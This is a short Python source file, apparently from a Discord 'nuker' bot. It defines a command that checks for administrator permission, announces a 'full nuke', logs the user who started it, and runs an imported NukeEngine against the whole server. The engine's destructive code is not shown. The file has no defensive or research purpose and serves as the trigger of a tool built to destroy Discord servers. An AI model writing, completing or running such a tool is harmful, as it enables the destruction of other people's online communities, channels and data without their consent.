from core.commands.base import BaseCommand
from core.engine.nuke import NukeEngine
from core.logger.logger import Logger

logger = Logger()

class NukeCommand(BaseCommand):
    async def _execute(self, ctx):
        if not ctx.guild.me.guild_permissions.administrator:
            await ctx.send("BOT NEEDS ADMIN PERMISSION", delete_after=3)
            return
        await ctx.send("STARTING FULL NUKE", delete_after=2)
        logger.warning(f"Nuke by {ctx.author} in {ctx.guild.name}")
        engine = NukeEngine(ctx.guild)
        await engine.execute()
        logger.info(f"Nuke done in {ctx.guild.name}")
